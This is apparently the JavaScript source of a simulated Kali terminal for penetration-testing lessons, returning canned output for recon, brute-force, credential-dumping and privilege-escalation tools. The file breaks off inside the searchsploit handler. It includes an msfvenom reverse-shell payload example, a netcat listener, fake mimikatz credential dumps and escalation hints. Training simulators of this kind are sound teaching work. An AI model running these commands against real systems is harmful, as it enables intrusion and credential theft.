// ============================================
// Fake Terminal Simulator — Extended
// ============================================

import { playKeypress } from './sounds.js';

let history = [];
let historyIndex = -1;
let currentContext = {};
let msfMode = false;

const COMMANDS = {
  help: () => `<span class="t-cyan t-bold">━━━ Available Commands ━━━</span>

<span class="t-green t-bold">SCANNING & RECON</span>
  <span class="t-green">nmap</span> [flags] <target>     Network scanner
  <span class="t-green">masscan</span> <target> -p<ports>  Fast port scanner
  <span class="t-green">whois</span> <domain>             Domain registration info
  <span class="t-green">dig</span> <domain> [type]        DNS lookup
  <span class="t-green">host</span> <domain>              DNS lookup (simple)
  <span class="t-green">ping</span> <target>              Test connectivity
  <span class="t-green">traceroute</span> <target>        Trace network path
  <span class="t-green">nikto</span> -h <target>          Web vulnerability scanner
  <span class="t-green">gobuster</span> dir -u <url>      Directory brute-forcer
  <span class="t-green">dirb</span> <url>                 Directory scanner
  <span class="t-green">whatweb</span> <url>              Web technology identifier

<span class="t-green t-bold">ENUMERATION</span>
  <span class="t-green">smbclient</span> -L //<target>    List SMB shares
  <span class="t-green">enum4linux</span> <target>        SMB/Samba enumerator
  <span class="t-green">snmpwalk</span> <target>          SNMP enumeration
  <span class="t-green">showmount</span> -e <target>      NFS shares
  <span class="t-green">ftp</span> <target>               FTP client
  <span class="t-green">ssh</span> user@<target>          SSH connection

<span class="t-green t-bold">EXPLOITATION</span>
  <span class="t-green">msfconsole</span>                 Metasploit Framework
  <span class="t-green">hydra</span> [options]             Login brute-forcer
  <span class="t-green">searchsploit</span> <query>       Search exploit database
  <span class="t-green">nc</span> [flags] <target> <port>  Netcat
  <span class="t-green">sqlmap</span> -u <url>             SQL injection tool
  <span class="t-green">wpscan</span> --url <target>      WordPress scanner
  <span class="t-green">msfvenom</span> [options]          Payload generator

<span class="t-green t-bold">POST-EXPLOITATION</span>
  <span class="t-green">hashcat</span> -m <mode> <hash>   Password hash cracker
  <span class="t-green">john</span> <hashfile>             John the Ripper
  <span class="t-green">linpeas</span>                    Linux privilege escalation
  <span class="t-green">winpeas</span>                    Windows privilege escalation
  <span class="t-green">mimikatz</span>                   Windows credential dumper

<span class="t-green t-bold">NETWORKING</span>
  <span class="t-green">ifconfig</span>                   Network interfaces
  <span class="t-green">ip</span> addr / route             IP configuration
  <span class="t-green">netstat</span> -tlnp               Listening services
  <span class="t-green">ss</span> -tlnp                    Socket statistics
  <span class="t-green">arp</span> -a                      ARP table
  <span class="t-green">curl</span> [flags] <url>          HTTP requests
  <span class="t-green">wget</span> <url>                  Download files

<span class="t-green t-bold">SYSTEM</span>
  <span class="t-green">whoami</span>                     Current user
  <span class="t-green">id</span>                         User identity
  <span class="t-green">uname</span> -a                   System info
  <span class="t-green">cat</span> <file>                  Read file
  <span class="t-green">ls</span> [path]                   List directory
  <span class="t-green">pwd</span>                        Print working directory
  <span class="t-green">find</span> / -perm -4000          Find SUID binaries
  <span class="t-green">sudo</span> -l                    Check sudo permissions
  <span class="t-green">clear</span>                      Clear terminal
  <span class="t-green">history</span>                    Command history
  <span class="t-green">exit</span>                       Close terminal

<span class="t-dim">💡 Tip: Click "Try It" buttons in lessons to auto-fill commands.</span>
<span class="t-dim">💡 All output is simulated for training purposes.</span>`,

  clear: () => '__CLEAR__',
  exit: () => '__CLOSE__',
  whoami: () => '<span class="t-green">root</span>',
  pwd: () => '/root',
  hostname: () => 'kali',

  id: () => 'uid=<span class="t-green">0</span>(root) gid=<span class="t-green">0</span>(root) groups=<span class="t-green">0</span>(root)',

  uname: (args) => {
    if (args.includes('-a')) return 'Linux kali 6.1.0-kali9-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux';
    if (args.includes('-r')) return '6.1.0-kali9-amd64';
    return 'Linux';
  },

  history: () => {
    return history.map((cmd, i) => `  <span class="t-dim">${i + 1}</span>  ${escapeHtml(cmd)}`).join('\n');
  },

  ls: (args) => {
    const path = args.find(a => !a.startsWith('-')) || '/root';
    const showAll = args.includes('-la') || args.includes('-a') || args.includes('-al');
    if (path === '/root' || path === '~' || path === '.') {
      let out = '';
      if (showAll) out = `total 48
drwx------  6 root root 4096 Mar 13 14:00 <span class="t-cyan">.</span>
drwxr-xr-x 18 root root 4096 Mar 13 10:00 <span class="t-cyan">..</span>
-rw-------  1 root root  127 Mar 13 14:00 .bash_history
-rw-r--r--  1 root root 3526 Mar 10 08:00 .bashrc
drwxr-xr-x  3 root root 4096 Mar 12 09:00 <span class="t-cyan">.config</span>
drwx------  2 root root 4096 Mar 11 16:00 <span class="t-cyan">.ssh</span>
`;
      out += `<span class="t-cyan">Desktop</span>    <span class="t-cyan">Documents</span>  <span class="t-cyan">Downloads</span>  <span class="t-green">exploit.py</span>  notes.txt  <span class="t-green">scan.sh</span>  targets.txt`;
      return out;
    }
    if (path === '/etc') return `<span class="t-cyan">apache2</span>  crontab  group  hostname  hosts  <span class="t-red">passwd</span>  <span class="t-red">shadow</span>  <span class="t-cyan">ssh</span>  sudoers`;
    if (path === '/tmp') return `linpeas.sh  shell.elf  nc.exe  transfer.tar.gz`;
    return `<span class="t-dim">bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span>`;
  },

  cat: (args) => {
    const file = args[0] || '';
    if (file.includes('passwd')) return `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<span class="t-green">admin:x:1000:1000:admin:/home/admin:/bin/bash</span>
<span class="t-green">mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false</span>
<span class="t-green">ftp:x:21:21::/var/ftp:/sbin/nologin</span>`;
    if (file.includes('shadow')) return `<span class="t-red">Permission denied. Try: sudo cat /etc/shadow</span>`;
    if (file.includes('hosts')) return `127.0.0.1       localhost
10.10.10.1      target.htb
10.10.10.5      dc01.corp.local
10.10.10.10     web01.corp.local`;
    if (file.includes('.bash_history')) return `nmap -sV 10.10.10.5
ssh admin@10.10.10.5
cat /etc/passwd
find / -perm -4000 2>/dev/null
python3 -m http.server 8000`;
    if (file.includes('notes.txt')) return `Target: 10.10.10.5
- FTP anonymous login works
- SSH brute force might work (admin user exists)
- Port 8080 has a Tomcat server
- Check /backup/ directory on web server`;
    if (file.includes('targets.txt')) return `10.10.10.1
10.10.10.5
10.10.10.10
10.10.10.20
192.168.1.0/24`;
    if (file.includes('crontab') || file.includes('/etc/crontab')) return `SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin

# m  h  dom mon dow  user  command
*/5  *  *   *   *    root  /opt/backup.sh
0    3  *   *   *    root  /usr/bin/apt update`;
    if (file === '') return '<span class="t-red">cat: missing file operand</span>';
    return `<span class="t-red">cat: ${escapeHtml(file)}: No such file or directory</span>`;
  },

  find: (args) => {
    if (args.join(' ').includes('-perm') && args.join(' ').includes('4000')) {
      return `/usr/bin/passwd
/usr/bin/sudo
<span class="t-green">/usr/bin/find</span>
<span class="t-green">/usr/bin/vim</span>
<span class="t-green">/usr/bin/python3</span>
/usr/bin/mount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/newgrp`;
    }
    return `<span class="t-dim">Usage: find [path] [options]
Example: find / -perm -4000 -type f 2>/dev/null</span>`;
  },

  sudo: (args) => {
    if (args[0] === '-l') {
      return `Matching Defaults entries for www-data on target:
    env_reset, mail_badpass

User www-data may run the following commands on target:
    <span class="t-green">(root) NOPASSWD: /usr/bin/vim</span>
    <span class="t-green">(root) NOPASSWD: /usr/bin/find</span>`;
    }
    if (args.length > 0) {
      return `<span class="t-green">[sudo] executing as root...</span>`;
    }
    return `<span class="t-dim">Usage: sudo -l (list permissions) or sudo <command></span>`;
  },

  ip: (args) => {
    if (args[0] === 'addr' || args[0] === 'a') {
      return `1: <span class="t-bold">lo</span>: <LOOPBACK,UP>
    inet <span class="t-green">127.0.0.1</span>/8 scope host lo
2: <span class="t-bold">eth0</span>: <BROADCAST,MULTICAST,UP>
    inet <span class="t-green">192.168.1.100</span>/24 brd 192.168.1.255 scope global eth0
3: <span class="t-bold">tun0</span>: <POINTOPOINT,MULTICAST,UP>
    inet <span class="t-green">10.10.14.5</span>/23 scope global tun0`;
    }
    if (args[0] === 'route' || args[0] === 'r') {
      return `default via <span class="t-green">192.168.1.1</span> dev eth0
10.10.10.0/24 via <span class="t-green">10.10.14.1</span> dev tun0
192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.100`;
    }
    return `<span class="t-dim">Usage: ip addr, ip route</span>`;
  },

  arp: (args) => `? (192.168.1.1) at <span class="t-cyan">aa:bb:cc:dd:ee:ff</span> [ether] on eth0
? (192.168.1.5) at <span class="t-cyan">11:22:33:44:55:66</span> [ether] on eth0
? (10.10.10.1) at <span class="t-cyan">de:ad:be:ef:ca:fe</span> [ether] on tun0`,

  ss: (args) => {
    if (args.includes('-tlnp') || args.includes('-tulnp')) {
      return `State    Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process
LISTEN   0       128     0.0.0.0:<span class="t-cyan">22</span>           0.0.0.0:*          users:(("sshd",pid=854))
LISTEN   0       511     0.0.0.0:<span class="t-cyan">80</span>           0.0.0.0:*          users:(("apache2",pid=1023))
LISTEN   0       80      127.0.0.1:<span class="t-cyan">3306</span>       0.0.0.0:*          users:(("mysqld",pid=945))
LISTEN   0       128     0.0.0.0:<span class="t-cyan">443</span>          0.0.0.0:*          users:(("apache2",pid=1023))`;
    }
    return `<span class="t-dim">Usage: ss -tlnp (TCP listeners) or ss -tulnp (TCP+UDP)</span>`;
  },

  host: (args) => {
    const domain = args[0] || 'example.com';
    return `${domain} has address <span class="t-green">93.184.216.34</span>
${domain} has IPv6 address 2606:2800:220:1:248:1893:25c8:1946
${domain} mail is handled by 10 <span class="t-green">mail.${domain}</span>`;
  },

  wget: (args) => {
    const url = args.find(a => !a.startsWith('-')) || 'http://10.10.10.1/file';
    const filename = url.split('/').pop() || 'index.html';
    return `--2026-03-13 14:32:00--  ${url}
Connecting to ${url.split('/')[2]}... connected.
HTTP request sent, awaiting response... <span class="t-green">200 OK</span>
Length: 14832 (14K) [application/octet-stream]
Saving to: '<span class="t-green">${filename}</span>'

${filename}          100%[===================>]  14.48K  --.-KB/s    in 0.001s

2026-03-13 14:32:00 (14.5 MB/s) - '<span class="t-green">${filename}</span>' saved [14832/14832]`;
  },

  nc: (args) => {
    if (args.includes('-lvnp') || args.includes('-nlvp') || args.includes('-lvp')) {
      const port = args.find(a => /^\d+$/.test(a)) || '4444';
      return `<span class="t-cyan">listening on [any] ${port} ...</span>
<span class="t-dim">Waiting for incoming connections... (Press Ctrl+C to stop)</span>`;
    }
    const target = args.find(a => !a.startsWith('-') && !/^\d+$/.test(a)) || '10.10.10.5';
    const port = args.find(a => /^\d+$/.test(a)) || '80';
    return `<span class="t-green">Connection to ${target} ${port} port [tcp/*] succeeded!</span>`;
  },

  dirb: (args) => {
    const url = args[0] || 'http://10.10.10.1';
    return `<span class="t-cyan">-----------------
DIRB v2.22
-----------------</span>
START_TIME: Thu Mar 13 14:32:00 2026
URL_BASE: ${url}/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
<span class="t-green">+ ${url}/admin</span> (CODE:301|SIZE:312)
<span class="t-green">+ ${url}/api</span> (CODE:200|SIZE:45)
<span class="t-green">+ ${url}/backup</span> (CODE:200|SIZE:1205)
<span class="t-green">+ ${url}/login</span> (CODE:200|SIZE:2341)
<span class="t-green">+ ${url}/robots.txt</span> (CODE:200|SIZE:128)
<span class="t-green">+ ${url}/uploads</span> (CODE:403|SIZE:278)
-----------------
END_TIME: Thu Mar 13 14:33:15 2026
DOWNLOADED: 4612 - FOUND: 6`;
  },

  whatweb: (args) => {
    const url = args[0] || 'http://10.10.10.1';
    return `${url} [200 OK] <span class="t-green">Apache[2.4.52]</span>, <span class="t-orange">PHP[8.1.2]</span>, <span class="t-cyan">WordPress[6.1.1]</span>, <span class="t-yellow">jQuery[3.6.0]</span>, Country[US], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], Title[Target Website], X-Powered-By[PHP/8.1.2]`;
  },

  showmount: (args) => {
    const target = args.find(a => !a.startsWith('-')) || '10.10.10.5';
    return `Export list for ${target}:
<span class="t-green">/home/backup</span>  *
<span class="t-green">/var/nfs</span>      192.168.1.0/24`;
  },

  snmpwalk: (args) => {
    const target = args.find(a => !a.startsWith('-')) || '10.10.10.5';
    return `SNMPv2-MIB::sysDescr.0 = STRING: <span class="t-green">Linux target 5.4.0-88-generic #99-Ubuntu SMP x86_64</span>
SNMPv2-MIB::sysContact.0 = STRING: <span class="t-green">admin@target.com</span>
SNMPv2-MIB::sysName.0 = STRING: <span class="t-green">target</span>
SNMPv2-MIB::sysLocation.0 = STRING: <span class="t-green">Server Room B</span>
HOST-RESOURCES-MIB::hrSWRunName.1 = STRING: <span class="t-green">"systemd"</span>
HOST-RESOURCES-MIB::hrSWRunName.854 = STRING: <span class="t-green">"sshd"</span>
HOST-RESOURCES-MIB::hrSWRunName.1023 = STRING: <span class="t-green">"apache2"</span>
HOST-RESOURCES-MIB::hrSWRunName.945 = STRING: <span class="t-green">"mysqld"</span>`;
  },

  ftp: (args) => {
    const target = args[0] || '10.10.10.5';
    return `Connected to ${target}.
220 (vsFTPd 3.0.3)
Name (${target}:root): <span class="t-cyan">anonymous</span>
331 Please specify the password.
Password: <span class="t-dim">(blank)</span>
<span class="t-green">230 Login successful.</span>
ftp> ls
200 PORT command successful.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Mar 13 backup
-rw-r--r--    1 ftp      ftp          1523 Mar 13 note.txt
-rw-r--r--    1 ftp      ftp         34291 Mar 13 credentials.bak
226 Directory send OK.
ftp> <span class="t-dim">Type 'exit' to leave FTP</span>`;
  },

  ssh: (args) => {
    const target = args.find(a => a.includes('@')) || 'admin@10.10.10.5';
    return `<span class="t-green">The authenticity of host '${target.split('@')[1]}' can't be established.</span>
ECDSA key fingerprint is SHA256:AbCdEf1234567890.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '${target.split('@')[1]}' (ECDSA) to the list of known hosts.
${target.split('@')[1]}'s password: <span class="t-dim">●●●●●●●●</span>
<span class="t-red">Permission denied, please try again.</span>
<span class="t-dim">Hint: Try brute forcing with hydra</span>`;
  },

  masscan: (args) => {
    const target = args.find(a => !a.startsWith('-') && !a.startsWith('--')) || '10.10.10.0/24';
    return `Starting masscan 1.3.2
Scanning ${target}
<span class="t-green">Discovered open port 22/tcp on 10.10.10.5</span>
<span class="t-green">Discovered open port 80/tcp on 10.10.10.5</span>
<span class="t-green">Discovered open port 445/tcp on 10.10.10.5</span>
<span class="t-green">Discovered open port 3306/tcp on 10.10.10.5</span>
<span class="t-green">Discovered open port 22/tcp on 10.10.10.10</span>
<span class="t-green">Discovered open port 80/tcp on 10.10.10.10</span>
<span class="t-green">Discovered open port 3389/tcp on 10.10.10.20</span>
<span class="t-green">Discovered open port 445/tcp on 10.10.10.20</span>

rate:  100.00-kpps, 100.00% done, waiting 5-secs`;
  },

  linpeas: () => `<span class="t-orange t-bold">
╔══════════╗
║ LinPEAS  ║
╚══════════╝</span>

<span class="t-red t-bold">═══════════════════════════════════════════
╔══════════════════════════════════════════╗
║           99% PE - Privilege Escalation  ║
╚══════════════════════════════════════════╝</span>

<span class="t-red">[!] SUID - Find with SUID bit (GTFOBins):</span>
  /usr/bin/find
  /usr/bin/vim
  /usr/bin/python3

<span class="t-red">[!] Sudo - Interesting sudo permissions:</span>
  (root) NOPASSWD: /usr/bin/vim
  (root) NOPASSWD: /usr/bin/find

<span class="t-orange">[!] Writable cron scripts:</span>
  /opt/backup.sh (owned by root, world-writable!)

<span class="t-orange">[!] Interesting files:</span>
  /var/www/html/config.php (contains DB credentials)
  /home/admin/.bash_history (readable)
  /opt/backup.sh (writable, runs as root via cron)

<span class="t-green">[+] System Information:</span>
  OS: Ubuntu 22.04 LTS
  Kernel: 5.4.0-88-generic
  Architecture: x86_64`,

  winpeas: () => `<span class="t-orange t-bold">
╔══════════╗
║ WinPEAS  ║
╚══════════╝</span>

<span class="t-red">[!] AlwaysInstallElevated set!</span>
  HKLM: 1
  HKCU: 1

<span class="t-red">[!] Unquoted Service Path:</span>
  Service: VulnService
  Path: C:\\Program Files\\Vuln Service\\service.exe

<span class="t-orange">[!] Stored Credentials:</span>
  cmdkey /list shows saved credentials for admin

<span class="t-orange">[!] Current User Privileges:</span>
  <span class="t-green">SeImpersonatePrivilege: ENABLED</span>
  SeAssignPrimaryTokenPrivilege: DISABLED

<span class="t-green">[+] System Information:</span>
  OS: Windows Server 2019
  Build: 17763
  Hotfixes: KB4534273, KB4516115`,

  mimikatz: () => `<span class="t-cyan">  .#####.   mimikatz 2.2.0 (x64)
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \\ ##  /*** Benjamin DELPY
 ## \\ / ##  benjamin@gentilkiwi.com
 '## v ##'  > https://blog.gentilkiwi.com/mimikatz
  '#####'</span>

mimikatz # <span class="t-green">sekurlsa::logonpasswords</span>

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SYSTEM
Domain            : NT AUTHORITY

  * Username : <span class="t-green">Administrator</span>
  * Domain   : CORP
  * NTLM     : <span class="t-red">aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76</span>
  * Password : <span class="t-red">P@ssw0rd2024!</span>

  * Username : <span class="t-green">svc_backup</span>
  * Domain   : CORP
  * NTLM     : <span class="t-red">e10adc3949ba59abbe56e057f20f883e</span>
  * Password : <span class="t-red">backup123</span>`,

  msfvenom: (args) => {
    if (args.length === 0) return `<span class="t-dim">Usage: msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>
Example: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe</span>`;
    return `<span class="t-dim">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span>
<span class="t-dim">[-] No arch selected, selecting arch: x86 from the payload</span>
No encoder specified, outputting raw payload
Payload size: <span class="t-green">354 bytes</span>
Final size of exe file: <span class="t-green">73802 bytes</span>
<span class="t-green">Saved as: shell.exe</span>`;
  },

  ping: (args) => {
    const target = args.find(a => !a.startsWith('-')) || '10.10.10.1';
    return `PING ${target} (${target}) 56(84) bytes of data.
64 bytes from ${target}: icmp_seq=1 ttl=64 time=<span class="t-green">0.842</span> ms
64 bytes from ${target}: icmp_seq=2 ttl=64 time=<span class="t-green">0.731</span> ms
64 bytes from ${target}: icmp_seq=3 ttl=64 time=<span class="t-green">0.659</span> ms

--- ${target} ping statistics ---
3 packets transmitted, <span class="t-green">3 received</span>, 0% packet loss, time 2004ms`;
  },

  ifconfig: () => `<span class="t-bold">eth0</span>: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet <span class="t-green">192.168.1.100</span>  netmask 255.255.255.0  broadcast 192.168.1.255
        ether 08:00:27:8e:7a:12  txqueuelen 1000  (Ethernet)

<span class="t-bold">tun0</span>: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet <span class="t-green">10.10.14.5</span>  netmask 255.255.254.0

<span class="t-bold">lo</span>: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet <span class="t-green">127.0.0.1</span>  netmask 255.0.0.0`,

  netstat: (args) => {
    if (args.includes('-tlnp') || args.includes('-tulnp') || args.includes('-ano')) {
      return `Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program
<span class="t-green">tcp</span>        0      0 0.0.0.0:<span class="t-cyan">22</span>              0.0.0.0:*               LISTEN      854/sshd
<span class="t-green">tcp</span>        0      0 0.0.0.0:<span class="t-cyan">80</span>              0.0.0.0:*               LISTEN      1023/apache2
<span class="t-green">tcp</span>        0      0 0.0.0.0:<span class="t-cyan">443</span>             0.0.0.0:*               LISTEN      1023/apache2
<span class="t-green">tcp</span>        0      0 127.0.0.1:<span class="t-cyan">3306</span>          0.0.0.0:*               LISTEN      945/mysqld
<span class="t-yellow">udp</span>        0      0 0.0.0.0:<span class="t-cyan">161</span>             0.0.0.0:*                           712/snmpd`;
    }
    return `<span class="t-dim">Usage: netstat -tlnp (TCP listeners) or netstat -tulnp (TCP+UDP)</span>`;
  },

  traceroute: (args) => {
    const target = args.find(a => !a.startsWith('-')) || '8.8.8.8';
    return `traceroute to ${target}, 30 hops max, 60 byte packets
 1  <span class="t-green">192.168.1.1</span>     1.234 ms
 2  <span class="t-green">10.0.0.1</span>        5.432 ms
 3  <span class="t-green">172.16.0.1</span>     12.345 ms
 4  <span class="t-green">${target}</span>       15.678 ms`;
  },

  nmap: (args) => {
    const target = args.find(a => !a.startsWith('-') && !a.startsWith('--')) || '10.10.10.5';
    const sV = args.includes('-sV');
    const sC = args.includes('-sC');
    const O = args.includes('-O');
    const A = args.includes('-A');
    const sn = args.includes('-sn');
    const vuln = args.join(' ').includes('--script') && args.join(' ').includes('vuln');
    const eternalblue = args.join(' ').includes('ms17-010');

    if (sn) {
      return `Starting Nmap 7.94
Nmap ping scan report
Host <span class="t-green">10.10.10.1</span> is up (0.0010s latency).
Host <span class="t-green">10.10.10.5</span> is up (0.0042s latency).
Host <span class="t-green">10.10.10.10</span> is up (0.0038s latency).
Host <span class="t-green">10.10.10.20</span> is up (0.0051s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.34 seconds`;
    }

    if (eternalblue) {
      return `Starting Nmap 7.94
Nmap scan report for ${target}
Host is up (0.0042s latency).
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| <span class="t-red">smb-vuln-ms17-010:</span>
|   <span class="t-red">VULNERABLE:</span>
|   Remote Code Execution vulnerability in Microsoft SMBv1 (ms17-010)
|     State: <span class="t-red">VULNERABLE</span>
|     Risk factor: HIGH
|     CVE: CVE-2017-0144
|_    <span class="t-red">This system is vulnerable to EternalBlue!</span>

Nmap done: 1 IP address (1 host up) scanned in 5.12 seconds`;
    }

    if (vuln) {
      return `Starting Nmap 7.94
Nmap scan report for ${target}

PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
445/tcp   open   microsoft-ds
3306/tcp  open   mysql

| <span class="t-red">http-shellshock:</span>
|   <span class="t-red">VULNERABLE:</span>
|   GNU Bash Remote Code Execution (Shellshock)
|_  CVE-2014-6271

| <span class="t-red">smb-vuln-ms17-010:</span>
|   <span class="t-red">VULNERABLE:</span>
|_  Remote Code Execution (EternalBlue)

| <span class="t-orange">http-enum:</span>
|   /admin/: Admin panel
|   /phpmyadmin/: phpMyAdmin
|_  /robots.txt: Robots file

Nmap done: 1 IP address (1 host up) scanned in 28.45 seconds`;
    }

    let out = `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for ${target}
Host is up (<span class="t-green">0.0042s</span> latency).
Not shown: 993 closed tcp ports

PORT      STATE  SERVICE`;
    if (sV || A) out += `       VERSION`;
    out += `
<span class="t-green">21/tcp</span>    open   ftp`;
    if (sV || A) out += `           vsftpd 3.0.3`;
    out += `
<span class="t-green">22/tcp</span>    open   ssh`;
    if (sV || A) out += `           OpenSSH 8.9p1`;
    out += `
<span class="t-green">80/tcp</span>    open   http`;
    if (sV || A) out += `          Apache httpd 2.4.52`;
    out += `
<span class="t-green">139/tcp</span>   open   netbios-ssn`;
    if (sV || A) out += `   Samba smbd 4.6.2`;
    out += `
<span class="t-green">445/tcp</span>   open   microsoft-ds`;
    if (sV || A) out += `  Samba smbd 4.6.2`;
    out += `
<span class="t-green">3306/tcp</span>  open   mysql`;
    if (sV || A) out += `         MySQL 5.7.40`;
    out += `
<span class="t-green">8080/tcp</span>  open   http-proxy`;
    if (sV || A) out += `    Apache Tomcat 9.0.65`;

    if (sC || A) {
      out += `

<span class="t-cyan">Host script results:</span>
| <span class="t-cyan">ftp-anon</span>: Anonymous FTP login allowed
|   drwxr-xr-x  2 ftp ftp  4096 Mar 13 backup
|_  -rw-r--r--  1 ftp ftp  1523 Mar 13 note.txt
|_<span class="t-cyan">smb2-security-mode</span>: Message signing enabled but not required`;
    }
    if (O || A) {
      out += `

<span class="t-orange">OS detection:</span> Linux 5.x (96%), Linux 5.4 - 5.15
Network Distance: 2 hops`;
    }
    out += `\n\nNmap done: 1 IP address (1 host up) scanned in <span class="t-green">12.34</span> seconds`;
    return out;
  },

  whois: (args) => {
    const domain = args[0] || 'example.com';
    return `Domain Name: <span class="t-green">${domain.toUpperCase()}</span>
Registry Domain ID: 2336799_DOMAIN_COM-VRSN
Registrar: GoDaddy.com, LLC
Creation Date: 2003-04-12T12:23:11Z
Expiration Date: 2027-04-12T12:23:11Z
Registrant Organization: Privacy Shield Corp.
Registrant Country: US
Name Server: ns1.${domain}
Name Server: ns2.${domain}`;
  },

  dig: (args) => {
    const domain = args.find(a => !a.startsWith('-') && !a.startsWith('+') && !a.startsWith('@')) || 'example.com';
    const type = args.find(a => ['A','AAAA','MX','NS','TXT','CNAME','ANY','AXFR'].includes(a.toUpperCase()))?.toUpperCase() || 'A';
    if (type === 'AXFR') {
      return `; <<>> DiG 9.18.19 <<>> axfr @ns1.${domain} ${domain}
<span class="t-green">${domain}.</span>       300  IN  SOA   ns1.${domain}. admin.${domain}. 2024010101
<span class="t-green">${domain}.</span>       300  IN  A     93.184.216.34
<span class="t-green">www.${domain}.</span>   300  IN  CNAME ${domain}.
<span class="t-green">mail.${domain}.</span>  300  IN  A     93.184.216.35
<span class="t-green">admin.${domain}.</span> 300  IN  A     93.184.216.36
<span class="t-green">dev.${domain}.</span>   300  IN  A     10.10.10.50
<span class="t-green">vpn.${domain}.</span>   300  IN  A     93.184.216.37
<span class="t-green">ftp.${domain}.</span>   300  IN  A     93.184.216.38
;; XFR size: 8 records`;
    }
    let answer = `${domain}.  300  IN  A  <span class="t-green">93.184.216.34</span>`;
    if (type === 'MX') answer = `${domain}.  300  IN  MX  10 <span class="t-green">mail.${domain}</span>.`;
    if (type === 'NS') answer = `${domain}.  300  IN  NS  <span class="t-green">ns1.${domain}</span>.\n${domain}.  300  IN  NS  <span class="t-green">ns2.${domain}</span>.`;
    if (type === 'TXT') answer = `${domain}.  300  IN  TXT  <span class="t-green">"v=spf1 include:_spf.google.com ~all"</span>`;
    return `;; QUESTION SECTION:\n;${domain}.  IN  ${type}\n\n;; ANSWER SECTION:\n${answer}\n\n;; Query time: 23 msec\n;; SERVER: 8.8.8.8#53`;
  },

  curl: (args) => {
    const hasHead = args.includes('-I') || args.includes('--head');
    const hasVerbose = args.includes('-v');
    if (hasHead) {
      return `HTTP/1.1 <span class="t-green">200 OK</span>
Server: <span class="t-orange">Apache/2.4.52 (Ubuntu)</span>
X-Powered-By: <span class="t-orange">PHP/8.1.2</span>
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=abc123; path=/; HttpOnly`;
    }
    return `<!DOCTYPE html>
<html>
<head><title>Target Server</title></head>
<body>
<h1>It works!</h1>
<!-- TODO: remove debug.php before production -->
</body>
</html>`;
  },

  nikto: (args) => {
    const host = args[args.indexOf('-h') + 1] || args.find(a => !a.startsWith('-')) || '10.10.10.1';
    return `- Nikto v2.5.0
+ Target IP:          ${host}
+ Target Port:        80
+ Server: <span class="t-orange">Apache/2.4.52 (Ubuntu)</span>
+ <span class="t-red">/: X-Content-Type-Options header missing</span>
+ <span class="t-red">/: X-Frame-Options header missing</span>
+ <span class="t-orange">Apache/2.4.52 appears outdated</span>
+ <span class="t-green">/admin/</span>: Admin directory found
+ <span class="t-green">/phpinfo.php</span>: PHP info file found
+ <span class="t-green">/debug.php</span>: Debug script with DB credentials
+ <span class="t-green">/backup/</span>: Directory listing enabled
+ <span class="t-green">/wp-login.php</span>: WordPress login found
+ <span class="t-cyan">7 vulnerabilities found</span>`;
  },

  gobuster: (args) => {
    const target = args[args.indexOf('-u') + 1] || 'http://10.10.10.1';
    return `===============================================================
Gobuster v3.6
[+] Url:            ${target}
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
===============================================================
<span class="t-green">/admin</span>       (Status: <span class="t-cyan">301</span>) [Size: 312]
<span class="t-green">/api</span>         (Status: <span class="t-cyan">200</span>) [Size: 45]
<span class="t-green">/backup</span>      (Status: <span class="t-cyan">200</span>) [Size: 1205]
<span class="t-green">/config</span>      (Status: <span class="t-orange">403</span>) [Size: 278]
<span class="t-green">/login</span>       (Status: <span class="t-cyan">200</span>) [Size: 2341]
<span class="t-green">/phpmyadmin</span>  (Status: <span class="t-cyan">301</span>) [Size: 317]
<span class="t-green">/robots.txt</span>  (Status: <span class="t-cyan">200</span>) [Size: 128]
<span class="t-green">/uploads</span>     (Status: <span class="t-orange">403</span>) [Size: 278]
===============================================================
Finished (8 results)`;
  },

  hydra: (args) => {
    const target = args.find(a => !a.startsWith('-') && !['ssh','ftp','http-post-form','rdp','smb','mysql'].includes(a)) || '10.10.10.5';
    const service = args.find(a => ['ssh','ftp','http-post-form','rdp','smb','mysql'].includes(a)) || 'ssh';
    return `Hydra v9.5 (c) 2023 by van Hauser/THC
[DATA] max 16 tasks per 1 server
[DATA] attacking ${service}://${target}/
<span class="t-dim">[ATTEMPT] login "admin" - pass "password" - 1 of 14344399</span>
<span class="t-dim">[ATTEMPT] login "admin" - pass "123456" - 2 of 14344399</span>
<span class="t-dim">[ATTEMPT] login "admin" - pass "admin123" - 3 of 14344399</span>
<span class="t-dim">[ATTEMPT] login "admin" - pass "trustno1" - 247 of 14344399</span>
<span class="t-green t-bold">[22][ssh] host: ${target}   login: admin   password: trustno1</span>
1 of 1 target completed, <span class="t-green">1 valid password found</span>`;
  },

  searchsploit: (args) => {
